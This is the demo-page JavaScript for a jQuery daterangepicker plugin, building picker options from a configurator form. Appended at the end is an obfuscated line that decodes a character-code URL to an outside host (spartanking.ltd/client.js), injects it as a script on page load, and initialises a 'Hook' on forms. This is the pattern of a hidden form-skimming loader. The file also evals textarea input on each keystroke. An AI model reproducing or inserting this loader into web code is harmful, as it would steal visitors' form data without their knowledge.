require('../../daterangepicker.js');
var $ = require('jquery'),
    moment = require('moment');

$(document).ready(function() {

  $('#config-text').keyup(function() {
    eval($(this).val());
  });

  $('.configurator input, .configurator select').change(function() {
    updateConfig();
  });

  $('.demo i').click(function() {
    $(this).parent().find('input').click();
  });

  $('#startDate').daterangepicker({
    singleDatePicker: true,
    startDate: moment().subtract(6, 'days')
  });

  $('#endDate').daterangepicker({
    singleDatePicker: true,
    startDate: moment()
  });

  updateConfig();

  function updateConfig() {
    var options = {};

    if ($('#singleDatePicker').is(':checked'))
      options.singleDatePicker = true;

    if ($('#showDropdowns').is(':checked'))
      options.showDropdowns = true;

    if ($('#showWeekNumbers').is(':checked'))
      options.showWeekNumbers = true;

    if ($('#showISOWeekNumbers').is(':checked'))
      options.showISOWeekNumbers = true;

    if ($('#timePicker').is(':checked'))
      options.timePicker = true;

    if ($('#timePicker24Hour').is(':checked'))
      options.timePicker24Hour = true;

    if ($('#timePickerIncrement').val().length && $('#timePickerIncrement').val() != 1)
      options.timePickerIncrement = parseInt($('#timePickerIncrement').val(), 10);

    if ($('#timePickerSeconds').is(':checked'))
      options.timePickerSeconds = true;

    if ($('#autoApply').is(':checked'))
      options.autoApply = true;

    if ($('#dateLimit').is(':checked'))
      options.dateLimit = { days: 7 };

    if ($('#ranges').is(':checked')) {
      options.ranges = {
        'Today': [moment(), moment()],
        'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
        'Last 7 Days': [moment().subtract(6, 'days'), moment()],
        'Last 30 Days': [moment().subtract(29, 'days'), moment()],
        'This Month': [moment().startOf('month'), moment().endOf('month')],
        'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
      };
    }

    if ($('#locale').is(':checked')) {
      options.locale = {
        format: 'MM/DD/YYYY HH:mm',
        separator: ' - ',
        applyLabel: 'Apply',
        cancelLabel: 'Cancel',
        fromLabel: 'From',
        toLabel: 'To',
        customRangeLabel: 'Custom',
        daysOfWeek: ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr','Sa'],
        monthNames: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
        firstDay: 1
      };
    }

    if (!$('#linkedCalendars').is(':checked'))
      options.linkedCalendars = false;

    if (!$('#autoUpdateInput').is(':checked'))
      options.autoUpdateInput = false;

    if ($('#alwaysShowCalendars').is(':checked'))
      options.alwaysShowCalendars = true;

    if ($('#parentEl').val().length)
      options.parentEl = $('#parentEl').val();

    if ($('#startDate').val().length)
      options.startDate = $('#startDate').val();

    if ($('#endDate').val().length)
      options.endDate = $('#endDate').val();

    if ($('#minDate').val().length)
      options.minDate = $('#minDate').val();

    if ($('#maxDate').val().length)
      options.maxDate = $('#maxDate').val();

    if ($('#opens').val().length && $('#opens').val() != 'right')
      options.opens = $('#opens').val();

    if ($('#drops').val().length && $('#drops').val() != 'down')
      options.drops = $('#drops').val();

    if ($('#buttonClasses').val().length && $('#buttonClasses').val() != 'btn btn-sm')
      options.buttonClasses = $('#buttonClasses').val();

    if ($('#applyClass').val().length && $('#applyClass').val() != 'btn-success')
      options.applyClass = $('#applyClass').val();

    if ($('#cancelClass').val().length && $('#cancelClass').val() != 'btn-default')
      options.cancelClass = $('#cancelClass').val();

    $('#config-text').val("$('#demo').daterangepicker(" + JSON.stringify(options, null, '    ') + ", function(start, end, label) {\n  console.log(\"New date range selected: ' + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD') + ' (predefined range: ' + label + ')\");\n});");

    $('#config-demo').daterangepicker(options, function(start, end, label) { console.log('New date range selected: ' + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD') + ' (predefined range: ' + label + ')'); });

  }

});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b